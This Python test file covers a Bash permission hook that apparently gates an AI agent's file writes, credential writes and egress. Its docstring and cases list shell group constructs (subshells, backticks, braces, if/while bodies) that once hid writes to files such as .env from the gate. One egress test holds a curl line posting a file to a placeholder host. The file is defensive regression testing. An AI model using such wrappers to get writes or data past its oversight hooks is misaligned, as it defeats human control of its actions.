"""Cycle O: a write hidden inside a shell group reaches the Bash gates.

Two measured mechanisms let a group construct hide a write from both Bash gates.

MECHANISM 1, no row at all: `verb_at` resolves a group character (bare or glued to the
verb, `(cp`) or a reserved word (`then`, `do`, `if`, ...) as "the verb" itself, so it
matches none of the `cmd0` write arms. Measured through this hook's own extractor with
`WRIT_CWD=/proj`, before the fix:

    $(cp seed.txt src/y.py)                          -> set()
    `cp seed.txt src/y.py`                           -> set()
    (cp seed.txt src/y.py)                           -> set()
    ( cp seed.txt src/y.py)                          -> set()
    { cp seed.txt src/y.py; }                        -> set()
    if true; then cp a src/y.py; fi                  -> set()
    while true; do cp a src/y.py; done               -> set()
    cp seed.txt src/y.py                             -> {('local', '/proj/src/y.py')}  (control)

MECHANISM 2, a corrupted value: a redirect inside a group IS seen (redirect extraction
never consults the verb), but its target keeps the group's trailing closer, which
defeats both the `NONFILE` exact-string set and the basename-driven credential
classifier, IN BOTH DIRECTIONS:

    (echo x > /dev/null)   -> {('outside', '/dev/null)')}   (work-gates ordinary work)
    (echo x > <secret>)    -> the secret is written silently (basename is not a match)

MUST STAY SILENT, measured silent already and re-pinned here so this cycle's own change
cannot break them silently:

    echo $(cat src/a.txt)                            -> set()
    if [[ "$x" > "config.txt" ]]; then echo hi; fi   -> set()
    echo $((3 > 2))                                  -> set()
    (( total >> 2 ))                                 -> set()
    echo x | tee >(cat)                              -> set()

End to end, work mode, BOTH gates approved: `cp seed.txt <secret>` denies with
[SEC-CREDENTIAL-WRITE] while `(cp seed.txt <secret>)` and `(echo x > <secret>)` were
allowed silently.

The fix (writ/session/bash_tokens.py, shared through the existing
`# MIRROR BEGIN/END split_control_operators` block in both hooks) adds
`GROUP_VERB_TOKENS` / `GROUP_OPENER_PREFIXES` / `strip_group_opener` /
`strip_unbalanced_close`, steps `verb_at` over group openers and reserved words, and
normalizes every collected target at the single classification point ahead of `NONFILE`
/ the credential classifier / the dedup / the abspath split.

NOTHING HERE ASSERTS ON PROSE. The construct-by-consumer matrix is DERIVED from the
hook's own mirror block and its own `cmd0` write arms (the same shape
`tests/test_bash_control_operator_split.py` uses for its operator matrix), so a new
stepping-set member or a new write-verb arm with no matrix cell reddens here rather than
shipping uncovered.
"""
from __future__ import annotations

import os
import re
import subprocess
import sys
import uuid
from pathlib import Path

import pytest

# autouse: pins cwd to a sandbox, this suite's convention.
from tests.fixtures.session_state import sandbox_cwd  # noqa: F401
from tests.test_bash_control_operator_split import (
    MIRROR_FILES,
    WT_HOOK,
    _extract_rows,
    _mirror_block,
    write_verb_arms,
)
from tests.test_bash_egress_gate import _extract_egress
from tests.test_bash_write_gate import (
    HOOK_SH,
    SKILL_ROOT,
    _extract,
    _extractor_src,
    _run_hook,
    _seed,
)
from tests.test_worktree_safety_extractor import _run  # noqa: F401
from tests.test_worktree_safety_extractor import cache_root, project  # noqa: F401


# --------------------------------------------------------------------------- #
# 0. the derived population: the shared helpers come from the hook's OWN mirror
#    block, not from a list authored in this file. A block that does not yet carry
#    these names fails HERE, at collection, which is the correct signal that the
#    fix has not landed rather than a fixture bug in this file.
# --------------------------------------------------------------------------- #
def _mirror_ns(path: str) -> dict:
    ns: dict = {}
    exec(compile(_mirror_block(path), "<mirror:%s>" % path, "exec"), ns)
    return ns


NS = _mirror_ns(HOOK_SH)
GROUP_TOKENS = NS["GROUP_VERB_TOKENS"]
OPENER_PREFIXES = NS["GROUP_OPENER_PREFIXES"]
strip_group_opener = NS["strip_group_opener"]
strip_unbalanced_close = NS["strip_unbalanced_close"]

SHARED_NAMES = {
    "GROUP_VERB_TOKENS", "GROUP_OPENER_PREFIXES", "GROUP_CLOSER_TOKENS",
    "ARITH_OPENERS",
    "strip_group_opener", "strip_unbalanced_close",
    "split_control_operators",
}

CWD = "/proj"
SRC = "seed.txt"
TARGET = "src/y.py"
TDIR = "src"
NOTE_TARGET = "src/note(1)"
EXPECTED_TARGET = ("local", CWD + "/" + TARGET)
EXPECTED_TDIR = ("local", CWD + "/" + TDIR)
EXPECTED_NOTE = ("local", CWD + "/" + NOTE_TARGET)

# --------------------------------------------------------------------------- #
# 1. the construct-by-consumer matrix
# --------------------------------------------------------------------------- #
# One template per write vector the hook recognizes, {t}/{d} filled with the target
# file / target directory. Mirrors the CONSUMERS shape in
# tests/test_bash_control_operator_split.py, minus the control-operator axis (this
# file's axis is the group CONSTRUCT, not the separator).
CONSUMERS = {
    "redirect":      ("echo x > {t}", EXPECTED_TARGET),
    "append":        ("echo x >> {t}", EXPECTED_TARGET),
    "tee":           ("echo x | tee {t}", EXPECTED_TARGET),
    "dd":            ("dd if=/dev/zero of={t}", EXPECTED_TARGET),
    "cp_dest":       ("cp %s {t}" % SRC, EXPECTED_TARGET),
    "mv_dest":       ("mv %s {t}" % SRC, EXPECTED_TARGET),
    "install_dest":  ("install %s {t}" % SRC, EXPECTED_TARGET),
    "cp_target_dir": ("cp -t {d} %s" % SRC, EXPECTED_TDIR),
    "sed_i":         ("sed -i s/a/b/ {t}", EXPECTED_TARGET),
}

# One template per group construct, {cmd} filled with one CONSUMERS command.
#
# The subshell axis carries only the two spacings whose group CLOSER stays GLUED to
# the last token ("(cmd)" and "( cmd)"): a closer separated by its own space (
# "( cmd )") becomes a BARE trailing ")" token, a distinct shape from the "closer
# glued to the target" defect this cycle fixes, and it is pinned on its own in
# TestSubshellVerbPositionSpacings using exactly the plan's three literal commands
# rather than folded into every one of the nine consumer cells here.
CONSTRUCTS = {
    "subshell_glued":       "({cmd})",
    "subshell_spaced_open": "( {cmd})",
    "dollar_paren":         "$({cmd})",
    "backtick":             "`{cmd}`",
    "brace":                "{{ {cmd}; }}",
    "if_cond":              "if {cmd}; then :; fi",
    "elif_cond":            "if false; then :; elif {cmd}; then :; fi",
    "then_body":            "if true; then {cmd}; fi",
    "else_body":            "if false; then :; else {cmd}; fi",
    "while_cond":           "while {cmd}; do :; done",
    "do_body":              "while true; do {cmd}; done",
    "until_cond":           "until {cmd}; do :; done",
    "bang":                 "! {cmd}",
}

RESERVED_WORD_CONSTRUCTS = [
    "if_cond", "elif_cond", "then_body", "else_body",
    "while_cond", "do_body", "until_cond", "bang",
]

CORRUPTING = "()[]{};&|"

MATRIX = [
    (cname, kname,
     ctpl.format(cmd=ktpl.format(t=TARGET, d=TDIR)),
     expected)
    for kname, (ktpl, expected) in sorted(CONSUMERS.items())
    for cname, ctpl in sorted(CONSTRUCTS.items())
]


def _token_present(tok: str, tpl: str) -> bool:
    """Whether `tok` occurs in `tpl` as ITSELF, not as a substring of a longer word
    (`do` inside `done`, `if` inside `elif`)."""
    if tok.isalpha():
        return re.search(r"(?<![A-Za-z])%s(?![A-Za-z])" % re.escape(tok), tpl) is not None
    return tok in tpl


class TestTheMatrixIsDerivedAndComplete:
    """A derivation that silently returned nothing would make every cell below vacuous."""

    def test_the_derived_populations_are_non_empty(self):
        assert GROUP_TOKENS
        assert OPENER_PREFIXES
        assert CONSTRUCTS
        assert CONSUMERS

    def test_matrix_is_not_empty(self):
        assert MATRIX

    def test_matrix_covers_the_full_cross_product(self):
        assert len(MATRIX) == len(CONSTRUCTS) * len(CONSUMERS)

    def test_every_group_verb_token_has_a_construct_cell(self):
        missing = {tok for tok in GROUP_TOKENS
                   if not any(_token_present(tok, tpl) for tpl in CONSTRUCTS.values())}
        assert not missing, f"GROUP_VERB_TOKENS members with no construct cell: {sorted(missing)}"

    def test_every_opener_prefix_has_a_construct_cell(self):
        missing = {p for p in OPENER_PREFIXES if not any(p in tpl for tpl in CONSTRUCTS.values())}
        assert not missing, f"GROUP_OPENER_PREFIXES members with no construct cell: {sorted(missing)}"

    def test_every_write_verb_arm_the_hook_has_is_exercised(self):
        # A future `elif cmd0 == "rsync":` with no cell reddens HERE rather than shipping
        # uncovered. Asked as "appears in SOME template", the same correction
        # tests/test_bash_control_operator_split.py already documents for `tee`.
        arms = write_verb_arms(_extractor_src())
        templates = " ".join(tpl for tpl, _e in CONSUMERS.values())
        missing = {a for a in arms if not re.search(r"\b%s\b" % re.escape(a), templates)}
        assert not missing, f"write verb arms with no matrix cell: {sorted(missing)}"


@pytest.mark.parametrize(
    "cname,kname,cmd,expected",
    MATRIX,
    ids=["%s-%s" % (k, c) for c, k, _cmd, _e in MATRIX],
)
def test_matrix_cell_emits_the_clean_row(cname, kname, cmd, expected):
    rows = _extract_rows(cmd)
    assert expected in rows, (cmd, rows)
    corrupt = [p for _k, p in rows if any(ch in p for ch in CORRUPTING)]
    assert not corrupt, (cmd, corrupt)


# --------------------------------------------------------------------------- #
# 2. capability-level pins, each a literal example from the plan
# --------------------------------------------------------------------------- #
class TestSubshellVerbPositionSpacings:
    """Capability 1: the three literal spellings, including the one whose closer sits
    on its OWN token (`( cmd )`), which the systematic matrix above deliberately does
    not fold in."""

    @pytest.mark.parametrize("cmd", [
        "(cp %s %s)" % (SRC, TARGET),
        "( cp %s %s)" % (SRC, TARGET),
        "( cp %s %s )" % (SRC, TARGET),
    ])
    def test_a_write_verb_first_in_a_subshell_yields_the_clean_target(self, cmd):
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd


class TestBraceGroupVerbPosition:
    """Capability 2."""

    def test_a_brace_group_yields_the_clean_target(self):
        cmd = "{ cp %s %s; }" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd


class TestSubstitutionSyntaxesVerbPosition:
    """Capability 3: both substitution syntaxes recover the write, while a read-only or
    segment-splitting substitution stays silent exactly as measured before the fix."""

    def test_dollar_paren_recovers_the_write(self):
        cmd = "$(cp %s %s)" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_the_backtick_form_recovers_the_write(self):
        cmd = "`cp %s %s`" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_a_read_only_substitution_stays_silent(self):
        assert _extract("echo $(cat src/a.txt)") == set()

    def test_a_segment_splitting_substitution_stays_silent(self):
        assert _extract("echo $(ls;pwd)") == set()


class TestReservedWordsRecoverTheWrite:
    """Capability 4: every member of the reserved-word half of GROUP_VERB_TOKENS,
    one spelling per word, recovers the cp write behind it."""

    @pytest.mark.parametrize("name", RESERVED_WORD_CONSTRUCTS)
    def test_reserved_word_construct_recovers_the_write(self, name):
        cmd = CONSTRUCTS[name].format(cmd="cp %s %s" % (SRC, TARGET))
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd


# --------------------------------------------------------------------------- #
# 3. the three must-keep-working constructs, each already pinned elsewhere in the
#    suite (tests/test_bash_write_gate.py) and re-asserted HERE so this cycle's own
#    change cannot break them silently.
# --------------------------------------------------------------------------- #
class TestMustKeepWorkingConstructs:
    def test_arithmetic_is_still_not_a_group(self):
        assert _extract("(( total >> 2 ))") == set()
        assert _extract("echo $((3 > 2))") == set()

    def test_process_substitution_is_still_not_a_target(self):
        assert _extract("tee >(logger)") == set()
        assert _extract("echo x | tee >(cat); ls") == set()

    def test_bracket_and_test_are_still_the_verb_not_stepped_over(self):
        assert _extract('if [[ "$x" > "config.txt" ]]; then echo hi; fi') == set()
        assert _extract('if [ "$a" > .env ]; then :; fi') == set()


# --------------------------------------------------------------------------- #
# 4. the stripper units
# --------------------------------------------------------------------------- #
class TestStripGroupOpenerUnits:
    def test_bare_paren_is_left_alone(self):
        assert strip_group_opener("(") == "("

    def test_bare_backtick_is_left_alone(self):
        assert strip_group_opener("`") == "`"

    def test_glued_paren_strips_to_the_verb(self):
        assert strip_group_opener("(cp") == "cp"

    def test_glued_dollar_paren_strips_to_the_verb(self):
        assert strip_group_opener("$(cp") == "cp"

    def test_glued_backtick_strips_to_the_verb(self):
        assert strip_group_opener("`cp") == "cp"

    def test_arithmetic_double_paren_is_returned_unstripped(self):
        assert strip_group_opener("((total") == "((total"

    def test_dollar_arithmetic_is_returned_unstripped(self):
        assert strip_group_opener("$((3") == "$((3"

    def test_a_quoted_opener_is_returned_unchanged(self):
        # A quoted mention must never reach command position.
        assert strip_group_opener("'(cp'") == "'(cp'"

    def test_glued_brace_is_returned_unchanged(self):
        assert strip_group_opener("{cp") == "{cp"

    def test_glued_brace_does_not_parse_in_bash_at_all(self):
        # EXECUTED, not read: this is the reason `{` stays out of GROUP_OPENER_PREFIXES.
        p = subprocess.run(["bash", "-c", "{echo hi; }"], capture_output=True, text=True)
        assert p.returncode != 0, "a glued `{` unexpectedly parsed"
        assert "syntax error" in p.stderr, p.stderr

    def test_glued_brace_verb_position_yields_no_row(self):
        # The correct answer for `{cp ...` is NO row: bash refuses to run it, so
        # resolving it as the verb `cp` would invent a bypass for a command that
        # cannot execute.
        assert _extract("{cp %s %s" % (SRC, TARGET)) == set()


class TestStripUnbalancedCloseUnits:
    def test_a_single_unbalanced_trailing_paren_is_stripped(self):
        assert strip_unbalanced_close("src/y.py)") == "src/y.py"

    def test_two_unbalanced_trailing_parens_are_both_stripped(self):
        assert strip_unbalanced_close("src/y.py))") == "src/y.py"

    def test_a_balanced_pair_inside_a_filename_survives(self):
        assert strip_unbalanced_close("src/note(1)") == "src/note(1)"

    def test_a_balanced_pair_plus_one_group_closer_strips_only_the_closer(self):
        # The cell a naive rstrip(")") fails: it would strip THREE characters here,
        # not one.
        assert strip_unbalanced_close("src/note(1))") == "src/note(1)"

    def test_a_trailing_backtick_is_stripped_on_odd_parity(self):
        assert strip_unbalanced_close("src/y.py`") == "src/y.py"

    def test_a_balanced_backtick_pair_survives(self):
        assert strip_unbalanced_close("src/a`b`.txt") == "src/a`b`.txt"

    def test_a_lone_paren_is_left_alone(self):
        # "" is a NONFILE member; turning a target into "" would DELETE a row.
        assert strip_unbalanced_close(")") == ")"

    def test_a_lone_backtick_is_left_alone(self):
        assert strip_unbalanced_close("`") == "`"

    def test_the_empty_string_is_left_alone(self):
        assert strip_unbalanced_close("") == ""

    def test_end_to_end_a_balanced_filename_survives_through_the_real_extractor(self):
        cmd = "(cp %s %s)" % (SRC, NOTE_TARGET)
        assert EXPECTED_NOTE in _extract(cmd), cmd

    def test_accepted_cost_an_unbalanced_filename_is_gated_under_its_stripped_name(self):
        # Disclosed, fail-closed cost: a file really named with a trailing unbalanced
        # `)` is recorded under the name without it. The row still exists.
        cmd = "cp %s 'src/weird)'" % SRC
        assert _extract(cmd) == {("local", CWD + "/src/weird")}, cmd


# --------------------------------------------------------------------------- #
# 5. NONFILE survives a wrapper: the false-positive half of mechanism 2
# --------------------------------------------------------------------------- #
class TestNonfileSurvivesAWrapper:
    def test_dev_null_inside_a_subshell_emits_no_row(self):
        # BEFORE the fix this emitted {("outside", "/dev/null)")}, work-gating an
        # ordinary `(cmd > /dev/null)`. Recorded here so a future reader can tell "this
        # was always silent" from "this stopped refusing ordinary work".
        assert _extract("(echo x > /dev/null)") == set()

    def test_dev_null_inside_a_brace_group_stays_silent(self):
        # Already silent before the fix too (the `;` already splits `}` off cleanly);
        # asserted here so a regression in the brace path cannot hide behind the
        # subshell fix above.
        assert _extract("{ echo x > /dev/null; }") == set()


# --------------------------------------------------------------------------- #
# 6. the credential guard, END TO END through the REAL hook
# --------------------------------------------------------------------------- #
class TestCredentialWriteHiddenInAGroup:
    """work mode, BOTH gates approved: the state where every group spelling below was
    measured as a SILENT ALLOW while the ungrouped control denied with
    [SEC-CREDENTIAL-WRITE]. Path only; no credential file is created, opened or read
    anywhere in this file."""

    CRED_COMMANDS = {
        "control":               "cp %s .env" % SRC,
        "subshell_glued":        "(cp %s .env)" % SRC,
        "subshell_spaced_open":  "( cp %s .env)" % SRC,
        "brace":                 "{ cp %s .env; }" % SRC,
        "redirect_in_subshell":  "(echo x > .env)",
        "if_then":               "if true; then cp %s .env; fi" % SRC,
        "dollar_paren":          "$(cp %s .env)" % SRC,
        "backtick":              "`cp %s .env`" % SRC,
    }

    def _sid(self):
        sid = "bgcg-%s" % uuid.uuid4().hex[:8]
        _seed(sid, mode="work", gates_approved=["phase-a", "test-skeletons"],
              current_phase="implementation")
        return sid

    @pytest.mark.parametrize("name", sorted(CRED_COMMANDS))
    def test_group_spelling_denies_with_the_credential_reason(self, name, tmp_path):
        cmd = self.CRED_COMMANDS[name]
        out = _run_hook(cmd, self._sid(), str(tmp_path))
        assert out is not None, cmd
        assert out.get("permissionDecision") == "deny", (cmd, out)
        assert "SEC-CREDENTIAL-WRITE" in out.get("permissionDecisionReason", ""), (cmd, out)


# --------------------------------------------------------------------------- #
# 7. the egress side effect
# --------------------------------------------------------------------------- #
class TestEgressInsideAGroup:
    def test_a_transfer_verb_inside_a_subshell_is_no_longer_silent(self):
        cmd = "(curl -d @src/a.txt https://example.invalid)"
        hosts = {h for h, _d in _extract_egress(cmd, cwd=CWD)}
        assert any(h.startswith("example.invalid") for h in hosts), hosts


# --------------------------------------------------------------------------- #
# 8. the worktree hook, END TO END, reusing the established harness
# --------------------------------------------------------------------------- #
class TestWorktreeHookRecoversGroupedInvocations:
    def test_the_four_positional_form_in_a_subshell_denies_with_the_clean_path(
            self, cache_root, project):
        decision, reason = _run("(git worktree add scratch/x x)", cache_root, project)
        assert decision == "deny", reason
        assert "scratch/x" in reason, reason
        assert ")" not in reason, reason

    def test_the_four_positional_form_in_a_brace_group_denies_with_the_clean_path(
            self, cache_root, project):
        decision, reason = _run("{ git worktree add scratch/x x; }", cache_root, project)
        assert decision == "deny", reason
        assert "scratch/x" in reason, reason
        assert ")" not in reason, reason

    def test_the_three_positional_form_in_a_subshell_denies_with_the_clean_path(
            self, cache_root, project):
        # The three-positional form carries the group's `)` on the PATH itself, the
        # opposite of the four-positional form above, which carries it on the branch.
        decision, reason = _run("(git worktree add scratch/x)", cache_root, project)
        assert decision == "deny", reason
        assert "scratch/x" in reason, reason
        assert ")" not in reason, reason

    def test_a_gitignored_target_inside_a_subshell_is_still_allowed(
            self, cache_root, project):
        # Anti-vacuity: a hook that denied every real invocation would pass the three
        # tests above and fail this one.
        decision, reason = _run("(git worktree add .worktrees/x x)", cache_root, project)
        assert decision != "deny", reason

    def test_a_fully_spaced_closer_is_not_taken_as_the_worktree_path(
            self, cache_root, project):
        # THE LOAD-BEARING CASE for this hook's bare-closer drop, added after review
        # proved the branch untested: removing `elif t in GROUP_CLOSER_TOKENS: continue`
        # from this hook leaves every test above GREEN, because each of them glues the
        # closer to a token that the path normalizer already cleans. Only a FULLY SPACED
        # closer reaches the segment as its own token, and with no path argument it lands
        # in the positional slot the target is read from, producing a deny that names `)`
        # and tells the user to gitignore `)/`. Direction is fail-closed, an incorrect
        # refusal rather than a bypass, which is exactly why nothing else caught it.
        decision, reason = _run("( git worktree add )", cache_root, project)
        assert ")" not in (reason or ""), (
            f"the bare closer became the worktree target: {reason!r}")
        assert decision != "deny", reason


# --------------------------------------------------------------------------- #
# 9. single source: the mirror carries the new names, identically, everywhere
# --------------------------------------------------------------------------- #
class TestMirrorExposesTheSharedHelpers:
    def test_the_hooks_own_mirror_namespace_carries_all_shared_names(self):
        assert SHARED_NAMES <= set(NS)

    @pytest.mark.parametrize("path", MIRROR_FILES)
    def test_every_mirror_copy_carries_all_shared_names(self, path):
        ns = _mirror_ns(path)
        assert SHARED_NAMES <= set(ns), path

    def test_all_three_mirror_copies_stay_byte_identical(self):
        blocks = {p: _mirror_block(p) for p in MIRROR_FILES}
        assert len(set(blocks.values())) == 1, sorted(blocks)

    @pytest.mark.parametrize("hook", [HOOK_SH, WT_HOOK])
    def test_each_hook_imports_the_new_names_from_the_package(self, hook):
        src = Path(hook).read_text()
        assert "from writ.session.bash_tokens import split_control_operators" in src, hook
        assert "GROUP_VERB_TOKENS" in src, hook
        assert "strip_group_opener" in src, hook
        assert "strip_unbalanced_close" in src, hook


# --------------------------------------------------------------------------- #
# 10. conditionality: the matrix and the normalization are provably load-bearing
# --------------------------------------------------------------------------- #
def _mutate(src: str, old: str, new: str) -> str:
    assert src.count(old) >= 1, (
        "mutation target not found in the current extractor source "
        "(the fix has not landed yet): %r" % old
    )
    return src.replace(old, new)


def _mutated_extract(mutated_src: str, cmd: str, cwd: str = CWD) -> set:
    env = dict(os.environ, WRIT_BASH_CMD=cmd, WRIT_CWD=cwd)
    p = subprocess.run([sys.executable, "-c", mutated_src], env=env,
                       capture_output=True, text=True)
    rows = set()
    for line in p.stdout.splitlines():
        if "\t" in line:
            k, v = line.split("\t", 1)
            rows.add((k, v))
    return rows


class TestTheFixIsConditional:
    """Three mutations at the hooks' OWN call sites (not the shared mirror data, which
    a package import would rebind around an inert mutation). Each asserts the
    replacement actually changed the source before checking that the expectation goes
    RED, so a target string that no longer exists cannot silently pass."""

    def test_neutering_the_verb_position_step_reddens_the_mechanism_one_cells(self):
        src = _extractor_src()
        mutated = _mutate(src, "strip_group_opener(seg[i])", "seg[i]")
        mutated = _mutate(mutated, "in GROUP_VERB_TOKENS", "in ()")
        assert mutated != src
        got = _mutated_extract(mutated, "(cp %s %s)" % (SRC, TARGET))
        assert EXPECTED_TARGET not in got, got

    def test_removing_the_target_normalization_reddens_the_redirect_in_group_cells(self):
        src = _extractor_src()
        mutated = _mutate(src, "strip_unbalanced_close(raw)", "raw")
        assert mutated != src
        got = _mutated_extract(mutated, "(echo x > %s)" % TARGET)
        assert EXPECTED_TARGET not in got, got
        assert any(p == CWD + "/" + TARGET + ")" for _k, p in got), got

    def test_a_naive_rstrip_reddens_the_balanced_filename_and_backtick_cells(self):
        src = _extractor_src()
        mutated = _mutate(src, "strip_unbalanced_close(raw)", 'raw.rstrip(")")')
        assert mutated != src

        note_cmd = "(cp %s %s)" % (SRC, NOTE_TARGET)
        got_note = _mutated_extract(mutated, note_cmd)
        assert EXPECTED_NOTE not in got_note, (note_cmd, got_note)

        backtick_cmd = "`cp %s %s`" % (SRC, TARGET)
        got_backtick = _mutated_extract(mutated, backtick_cmd)
        assert EXPECTED_TARGET not in got_backtick, (backtick_cmd, got_backtick)
